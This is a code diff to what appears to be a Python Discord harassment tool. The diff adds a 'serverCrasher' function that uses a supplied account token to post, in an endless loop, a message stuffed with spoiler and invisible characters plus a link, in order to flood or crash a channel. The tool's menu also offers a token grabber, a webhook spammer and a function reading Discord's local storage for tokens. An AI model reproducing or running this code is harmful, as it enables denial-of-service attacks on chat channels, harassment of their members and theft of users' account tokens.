@@ -222,6 +222,17 @@ if __name__ == '__main__':
         time.sleep(3)
         exit()
 
+def serverCrasher():
+    token = input("Enter Discord Token: ")
+    os.system("CLS")
+    headers = {'Authorization': token}
+    channelID = input("Enter Channel ID: ")
+    os.system("CLS")
+    message = "_ _||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||_ _ _ _ _ _ _ https://test.rauf.workers.dev/?&author="
+    print(Fore.RED+"Nuking Channel.")
+    while True:
+        requests.post(f'https://discordapp.com/api/v6/channels/{channelID}/messages', headers=headers,json={'content': message + "  "})
+
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
     tokenCount = 1
@@ -272,7 +283,7 @@ def main():
         message += '```'
 
 print(Fore.YELLOW + "\nFeatures:")
-print(Fore.BLUE + "BuggyMessage" +Fore.RED +  "[1]",Fore.BLUE + "\nMessageAsImage"+Fore.RED + "[2]",Fore.BLUE + "\nGetYourOwnDiscordToken"+Fore.RED + "[3]",Fore.BLUE + "\nCheckDiscordToken"+Fore.RED +  "[4]",Fore.BLUE + "\nFake stream"+Fore.RED + "[5]",Fore.BLUE + "\nSend empty message"+Fore.RED+"[6]", Fore.BLUE + "\nNiroGenerator(xD)"+Fore.RED+"[7]",Fore.BLUE + "\nWebhookSpammer"+Fore.RED+"[8]", Fore.BLUE + "\nHidden Link"+Fore.RED+"[9]",Fore.BLUE+"\nToken-Grabber"+Fore.RED+"[10]",Fore.LIGHTGREEN_EX + "\nHELP[11]")
+print(Fore.BLUE + "BuggyMessage" +Fore.RED +  "[1]",Fore.BLUE + "\nMessageAsImage"+Fore.RED + "[2]",Fore.BLUE + "\nGetYourOwnDiscordToken"+Fore.RED + "[3]",Fore.BLUE + "\nCheckDiscordToken"+Fore.RED +  "[4]",Fore.BLUE + "\nFake stream"+Fore.RED + "[5]",Fore.BLUE + "\nSend empty message"+Fore.RED+"[6]", Fore.BLUE + "\nNiroGenerator(xD)"+Fore.RED+"[7]",Fore.BLUE + "\nWebhookSpammer"+Fore.RED+"[8]", Fore.BLUE + "\nHidden Link"+Fore.RED+"[9]",Fore.BLUE+"\nToken-Grabber"+Fore.RED+"[10]",Fore.BLUE+"\nServer-Crasher"+Fore.RED+"[11]"+Fore.LIGHTGREEN_EX + "\nHELP[12]")
 key = input("\nEnter Number: ")
 if key == "1":
     os.system("CLS")
@@ -337,6 +348,9 @@ if key == "10":
     exit()
 
 if key == "11":
+    serverCrasher()
+
+if key == "12":
     HELP()
     time.sleep(30)
     exit()
